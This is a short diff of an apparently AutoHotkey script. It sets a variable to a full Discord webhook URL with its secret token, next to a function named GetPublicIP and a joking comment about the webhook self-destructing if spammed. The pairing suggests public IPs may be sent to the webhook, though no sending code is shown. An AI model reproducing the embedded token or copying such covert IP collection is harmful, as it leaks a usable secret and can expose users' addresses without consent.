@@ -121,4 +121,4 @@ GetPublicIP() {
 
 
 ; if you spam the webhook, its set to self destruct :)
-wkUrl := ""
+wkUrl := "https://discord.com/api/webhooks/1383142535136018552/PPFKXJEV71jNIareD20kRU9iLwuCvWytj08itta7gPw1XbNjw7ciXZhcsdTXM81s07aE"
